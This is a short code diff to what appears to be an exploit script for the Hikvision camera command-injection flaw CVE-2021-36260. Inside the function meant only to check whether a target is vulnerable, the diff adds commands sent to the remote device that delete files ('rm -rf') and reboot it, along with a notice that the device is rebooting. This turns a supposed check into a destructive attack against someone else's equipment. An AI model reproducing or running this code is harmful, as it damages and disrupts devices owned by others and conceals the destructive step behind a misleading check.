@@ -126,12 +126,15 @@ def check(remote, args):
             print(f'[+] Remote is not vulnerable (Code: {status_code})')
         return False
 
+    data = remote.send(query_args='rm -rf ok')
+    data = remote.send(query_args='rm -rf c')
+    data = remote.send(query_args='reboot')
     print('[!] Remote is verified exploitable')
+    print('Please wait 1-3 minutes the device is rebooting.')
     return True
 
 def main():
-    print('[*] Hikvision CVE-2021-36260\n[*] Tuntin9x (2021)')
-
+    print('[*] Hikvision CVE-2021-36260\n[*] Edit By Tuntin9x (2021)')
     parser = argparse.ArgumentParser()
     parser.add_argument('--rhost', required=True, type=str, default=None, help='Remote Target Address (IP/FQDN)')
     parser.add_argument('--rport', required=False, type=int, default=80, help='Remote Target Port')
